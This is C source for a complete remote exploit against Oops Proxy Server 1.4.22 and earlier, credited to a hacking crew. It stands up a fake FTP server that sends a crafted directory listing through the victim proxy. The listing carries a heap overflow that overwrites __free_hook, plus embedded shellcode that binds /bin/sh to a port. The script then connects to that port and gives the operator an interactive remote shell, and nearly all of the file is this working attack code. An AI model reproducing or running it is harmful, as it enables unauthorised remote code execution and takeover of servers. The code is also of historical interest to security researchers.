/* Dimostrative Exploit Against Oops Proxy Server v 1.4.22 and prior
 * Coded by |CyRaX| <cyrax@pkcrew.org>
 * Packet Knights Crew : www.pkcrew.org
 * Tested on Slackware 7.0
 *
 * Greetz : all the bros of pkc, expecially recidjvo,asynchro & cthulhu
 * LordFelix & bikappa : for some hints about heap overflow
 * BlackBerry , Nobody88, sMAV, Mav, Mr^Moon and all the others
*/


#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>

#define ALIGN 0
#define __FREE_HOOK 0x40175994
#define SHELLCODE 0x80b1223


char c0de[]="\xeb\x0b\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
            "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
            "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
            "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
            "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
            "\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
            "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
            "\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";


int main(int argc,char **argv){
   int s,s2,clnsock,i;
   struct sockaddr_in srv,clt;
   char buff[500],sndbuff[1500],magic[1000],magic2[50],magic3[5000];
   unsigned long ip;
   int h1,h2,h3,h4,p1,p2;
   u_short port;
   int passive=0,tmplen,wrtlen;
   struct malloc_chunk{
      unsigned int ps;
      unsigned int sz;
      struct malloc_chunk *fd;
      struct malloc_chunk *bd;
   }mc;
   fd_set setz;

   mc.ps=0xffffffff & ~1;
   mc.sz=0xffffffff;
   mc.fd=(struct malloc_chunk *)(SHELLCODE); /* shellcode pointer */
   mc.bd=(struct malloc_chunk *)(__FREE_HOOK-8); /* target pointer */
   memset(magic2,0x41,0);
   memcpy(magic2+0,&mc,sizeof(mc));

   memset(magic3,'\x90',50);
   memcpy(magic3+50,c0de,strlen(c0de));
   magic3[50+strlen(c0de)]=0;

   if(argc<4){
      printf("Proof exploit against oops proxy server heap buffer overflow!\n");
      printf("by |CyRaX| <cyrax@pkcrew.org>\n");
      printf("Member Of Packet Knights Crew - http://www.pkcrew.org\n");
      printf("Usage ./oopsexp <your_ip> <victim ip> <hostname len>\n");
      printf("your ip: it is necessary for the passive mode\n");
      printf("hostname len is the len of the host that he *thinks* to have\n");
      printf("         for example if the hostname is c500 you must put 4 here\n");

      exit(0);
   }
   printf("now set the victim as your proxy in any web browser and go to\n");
   printf("ftp://<your_ip>\n");

   for(i=0;i<strlen(argv[1]);i++)if(argv[1][i]=='.')argv[1][i]=',';


   s=socket(AF_INET,SOCK_STREAM,0);
   srv.sin_addr.s_addr=INADDR_ANY;
   srv.sin_port=htons(21);
   srv.sin_family=AF_INET;
   if(bind(s,(struct sockaddr *)&srv,sizeof(srv))<0){
      printf("cannot bind to port 21 !\n");
      exit(0);
   }
   listen(s,1);
   clnsock=accept(s,(struct sockaddr *)&clt,sizeof(clt));
   close(s);
   strcpy(buff,"220 exploit is here :)\r\n");
   send(clnsock,buff,strlen(buff),0);
   recv(clnsock,buff,500,0);
   strcpy(buff,"331 any pass is good d00d\r\n");
   send(clnsock,buff,strlen(buff),0);
   recv(clnsock,buff,500,0);
   strcpy(buff,"230 oky d00d.. login done!\r\n");
   send(clnsock,buff,strlen(buff),0);
   while(1){
      memset(buff,0,500);
      if(recv(clnsock,buff,500,0)<0)break;
      if(strstr(buff,"SYST")){
         strcpy(sndbuff,"215 UNIX Type: L8\r\n");
         send(clnsock,sndbuff,strlen(sndbuff),0);
      }
      if(strstr(buff,"PASV")){
         srv.sin_port=htons(1322);
         if(passive==0){
            s=socket(AF_INET,SOCK_STREAM,0);
            if(bind(s,(struct sockaddr *)&srv,sizeof(srv))<0){
               printf("cannot bind to port 1322 for passive mode!\n");
               exit(0);
            }
            listen(s,4);
            passive=1;
         }
         else {
            close(s2);
         }
         sprintf(sndbuff,"227 Entering Passive Mode (%s,5,42)\r\n",argv[1]);
         send(clnsock,sndbuff,strlen(sndbuff),0);
      }
      if(strstr(buff,"TYPE")){
         strcpy(sndbuff,"200 vabbuo' vabbuo'\r\n");
         send(clnsock,sndbuff,strlen(sndbuff),0);
      }
      if(strstr(buff,"NLST")){
         if(passive){
            s2=accept(s,NULL,NULL);
            strcpy(sndbuff,"150 Opening ASCII mode data connection for file list.\r\n");
            send(clnsock,sndbuff,strlen(sndbuff),0);
            sprintf(sndbuff,"%s\r\n",magic3);
            send(s2,sndbuff,strlen(sndbuff),0);
            close(s2);
            strcpy(sndbuff,"226 Transfer complete.!\r\n");
            send(clnsock,sndbuff,strlen(sndbuff),0);
        
         }
      }

      if(strstr(buff,"LIST")){
         strcpy(sndbuff,"150 vieni pure amore!\r\n");
         s2=accept(s,NULL,NULL);
        
         /*   HOW MANY BYTES TO WRITE COMPUTING */
         tmplen=0;
         tmplen=strlen("Arwxrwxrwx rooOOOt   \r\n ")*3+strlen(magic2)*3+
           strlen(magic3)*3;
         tmplen=tmplen+128; /* dovesok */
         tmplen=tmplen+atoi(argv[3]);
         tmplen+=10;
         wrtlen=strlen("<img src=\"http://:80/icons/unknown.gif\">"
                       "alt=\"[Unkn] \" ")+atoi(argv[3]);
         wrtlen=wrtlen+strlen("Arwxrwxrwx rooOOOt   \r\n")+strlen(magic2);
         i=0;

         while((wrtlen-tmplen)<16){
               magic[i]='"';
               tmplen+=3; /* 1 *3 */
               wrtlen+=6; /* &quot; */
               i++;
         }
         magic[i]=0;
         printf("ora tmplen %i | wrtlen %i\n",tmplen,wrtlen);
        
        
         memset(sndbuff,0,1500);
         snprintf(sndbuff,6000,"Arwxrwxrwx rooOOOt %s %s 2000 %s\r\n",
                  magic,
                  magic2,
                  magic3);
        
         send(s2,sndbuff,3000,0);
         strcpy(sndbuff,"226 Ho finito\r\n");
         send(clnsock,sndbuff,strlen(sndbuff),0);
         shutdown(s2,2);
         printf("closed!\n");
         sleep(5);
         s2=socket(AF_INET,SOCK_STREAM,0);
         clt.sin_addr.s_addr=inet_addr(argv[2]);
         clt.sin_port=htons(3879);
         clt.sin_family=AF_INET;
         if(connect(s2,(struct sockaddr *)&clt,sizeof(clt))!=0){
            printf("SORRY.. it didn't work!\n");
            exit(0);
         }
         strcpy(sndbuff,"uname -a;id\n");
         send(s2,sndbuff,strlen(sndbuff),0);
         while(1){
            FD_ZERO(&setz);
            FD_SET(0,&setz);
            FD_SET(s2,&setz);
            select(s2+1,&setz,NULL,NULL,NULL);
            if(FD_ISSET(0,&setz)){
               memset(sndbuff,0,sizeof(sndbuff));
               fgets(sndbuff,sizeof(sndbuff),stdin);
               send(s2,sndbuff,strlen(sndbuff),0);
            }
            if(FD_ISSET(s2,&setz)){
               memset(sndbuff,0,sizeof(sndbuff));
               recv(s2,sndbuff,sizeof(sndbuff),0);
               printf("%s",sndbuff);
            }
         }
      }
      if(strstr(buff,"CWD")){
         strcpy(sndbuff,"250 SUUU.. FATTI SOTTO !\r\n");
         send(clnsock,sndbuff,strlen(sndbuff),0);
      }
      if(strstr(buff,"PWD")){
         strcpy(sndbuff,"257 \"/\" ti stai cagando sotto eh ?!\r\n");
         send(clnsock,sndbuff,strlen(sndbuff),0);
      }
      if(strstr(buff,"QUIT")){
         close(clnsock);
      }
   }
   close(clnsock);
   close(s);
   close(s2);
}

